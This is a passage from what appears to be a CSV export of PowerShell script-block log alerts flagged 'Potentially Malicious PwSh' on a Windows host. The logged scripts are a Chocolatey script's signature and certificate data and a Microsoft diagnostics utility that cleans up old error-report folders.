ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgLXLfDm5ZO0F7n2Nexf5QBKk9rmoDUthxG+r4 # F9i69HgwDQYJKoZIhvcNAQEBBQAEggEAb2mru9l/KwdisLhftWBpxN2YplsjnNO8 # zOerUDH77YZLnOp6pfxlw9UDk6p2H7ZSf3PJz+1J4ENwf5p+TfyvqyZyYXPQ32to # qWgjxlTneLaqxbY8CnJe+4NWxDAEhbhSMObYX29KYVIq+iJ1q9yYpR2pNuE+/PAq # I3FXS45kX4WtsOfVnkJnWM/oIKKfEuywPi+a6l4dy/jMsEP3rzCdHjJIziLcIJ34 # lSv2YwwyUk8CYmQfWMAFLZfhH1Y8jmL6IR59aaSJ3oJxesogSfNvDK+LLc6tch7I # enySIVHhp4EaIijUSmbziY7zSHwkwnEwMWOKWcUxUQltJ+Rw/85ynKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUumRD/TbOT5Vq6kjT # F5SC4Ge0EbQwDQYJKoZIhvcNAQEBBQAEggEADeiy6pwgzhNhQoFY5dlA/QDn7A/Z # +0d5nogna5UjTzViKkhfAEXFS7/3Y0MNKSu7K9ypaZ5nSaBImxkGX40IAN0yzsU1 # RpA4GbDCp7JpLvFPmKBnuAKTOgvAr1b+wbojbWa24lAF/8gtvWw8Y4kjKQ3gvtPz # bpZWF+2pp5JBG+dpRHLizYL0ypB6Q/y0Vk9D3UvkdIpTfNG4OFZXxLVeh5/2V192 # LiKSonbjK4o8DXy85RvSk46BG2n1fy5M5vDQZZE6NAN61k306Jz15G76zQZ7vQx8 # bKdBLHWQb5jMK5+3EetGt+PpBoSAXLmYWaKKOojWHMUWnAYUf5kILPdPSA== # SIG # End signature block","MessageNumber: 2 ¦ MessageTotal: 2 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Start-ChocolateyProcessAsAdmin.ps1 ¦ ScriptBlockId: 8540c236-8439-4e72-bde4-37c6a1cf2d33 ¦ ScriptBlockText: lsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgLXLfDm5ZO0F7n2Nexf5QBKk9rmoDUthxG+r4 # F9i69HgwDQYJKoZIhvcNAQEBBQAEggEAb2mru9l/KwdisLhftWBpxN2YplsjnNO8 # zOerUDH77YZLnOp6pfxlw9UDk6p2H7ZSf3PJz+1J4ENwf5p+TfyvqyZyYXPQ32to # qWgjxlTneLaqxbY8CnJe+4NWxDAEhbhSMObYX29KYVIq+iJ1q9yYpR2pNuE+/PAq # I3FXS45kX4WtsOfVnkJnWM/oIKKfEuywPi+a6l4dy/jMsEP3rzCdHjJIziLcIJ34 # lSv2YwwyUk8CYmQfWMAFLZfhH1Y8jmL6IR59aaSJ3oJxesogSfNvDK+LLc6tch7I # enySIVHhp4EaIijUSmbziY7zSHwkwnEwMWOKWcUxUQltJ+Rw/85ynKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUumRD/TbOT5Vq6kjT # F5SC4Ge0EbQwDQYJKoZIhvcNAQEBBQAEggEADeiy6pwgzhNhQoFY5dlA/QDn7A/Z # +0d5nogna5UjTzViKkhfAEXFS7/3Y0MNKSu7K9ypaZ5nSaBImxkGX40IAN0yzsU1 # RpA4GbDCp7JpLvFPmKBnuAKTOgvAr1b+wbojbWa24lAF/8gtvWw8Y4kjKQ3gvtPz # bpZWF+2pp5JBG+dpRHLizYL0ypB6Q/y0Vk9D3UvkdIpTfNG4OFZXxLVeh5/2V192 # LiKSonbjK4o8DXy85RvSk46BG2n1fy5M5vDQZZE6NAN61k306Jz15G76zQZ7vQx8 # bKdBLHWQb5jMK5+3EetGt+PpBoSAXLmYWaKKOojWHMUWnAYUf5kILPdPSA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2022-04-29 10:22:09.141 +02:00","Potentially Malicious PwSh","med","PEGASUS01","PwSh",4104,104,"ScriptBlock: # Copyright © 2008, Microsoft Corporation. All rights reserved. #Common utility functions Import-LocalizedData -BindingVariable localizationString -FileName CL_LocalizationData # Function to get user troubleshooting history function Get-UserTSHistoryPath { return ""${env:localappdata}\diagnostics"" } # Function to get admin troubleshooting history function Get-AdminTSHistoryPath { return ""${env:localappdata}\elevateddiagnostics"" } # Function to get user report folder path function Get-UserReportPath { return ""${env:localappdata}\Microsoft\Windows\WER\ReportQueue"" } # Function to get system report folder path function Get-MachineReportPath { return ""${env:AllUsersProfile}\Microsoft\Windows\WER\ReportQueue"" } # Function to get threshold to check whether a folder is old function Get-ThresholdForCheckOlderFile { [int]$threshold = -1 return $threshold } # Function to get threshold for deleting WER folder function Get-ThresholdForFileDeleting() { [string]$registryEntryPath = ""HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting"" [string]$registryEntryName = ""PurgeThreshholdValueInKB"" [double]$defaultValue = 10.0 return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue } # Function to get the size of a directory in kb function Get-FolderSize([string]$folder = $(throw ""No folder is specified"")) { if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) { return 0 } if(-not $Global:DirectoryObject) { $Global:DirectoryObject = New-Object -comobject ""Scripting.FileSystemObject"" } return ($Global:DirectoryObject.GetFolder($folder).Size) / 1kb } # Function to delete a folder function Delete-Folder([string]$folder = $(throw ""No folder is specified"")) { if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) { return } Remove-Item -literalPath $folder -Recurse -Force } # Function to delete old folders function Delete-OldFolders($folder=$(throw ""No folder is specified"")) { if(($folder -eq $null) -or (-not(Test-Path $folder))) { return } [int]$threshold = Get-ThresholdForCheckOlderFile $folders = Get-ChildItem -LiteralPath ($folder.FullName) -Force | Where-Object {$_.PSIsContainer} if($folders -ne $null) { foreach($folder in $folders) { if((($folder.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0) { Delete-Folder ($folder.FullName) } else { Delete-OldFolders (Get-Item ($folder.FullName)) } } } } # Function to get registry value function Get-RegistryValue([string]$registryEntryPath = $(throw ""No registry entry path is specified""), [string]$registryEntryName = $(throw ""No registry entry name is specified""), [double]$defaultValue = 0.0) { [double]$registryEntryValue = $defaultValue $registryEntry = Get-ItemProperty -Path $registryEntryPath -Name $registryEntryName if($registryEntry -ne $null) { $registryEntryValue = $registryEntry.$registryEntryName } return $registryEntryValue } # Function to get the percentage that WER queue can take up function Get-Percentage() { [string]$registryEntryPath = ""HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting"" [string]$registryEntryName = ""MaxQueueSizePercentage"" [double]$defaultValue = 100.0 return Get-RegistryValue $registryEntryPath $registryEntryName $defaultValue } # Function to get free disk space on machine function Get-FreeSpace { [double]$freeSpace = 0.0 [string]$wql = ""SELECT * FROM Win32_LogicalDisk WHERE MediaType=12"" $drives = Get-WmiObject -query $wql if($null -ne $drives) { foreach($drive in $drives) { $freeSpace += ($drive.freeSpace) } } return ($freeSpace / 1KB) } # Function to get all unnecessary files function Get-UnnecessaryFiles([string]$folder = $(throw ""No folder is specified"")) { if([String]::IsNullOrEmpty($folder) -or (-not(Test-Path $folder))) { return $null } [int]$threshold = Get-ThresholdForCheckOlderFile return (Get-ChildItem -literalPath $folder -Recurse -Force | Where-Object {($_.PSIsContainer) -and ((($_.CreationTime).CompareTo((Get-Date).AddMonths($threshold))) -lt 0)}) } # Function to format disk space (KB -> MB) function Format-DiskSpaceMB([double]$space = $(throw ""No space is specified"")) { return [string]([Math]::Round(($space / 1KB), 3)) } # Function to format disk space (B -> GB) Function Format-DiskSpaceGB([double]$space = $(throw ""No space is specified"")) { return [string]([Math]::Round(($space / 1GB), 3)) } # Function to attach item to the list with delimiter ""/"" function 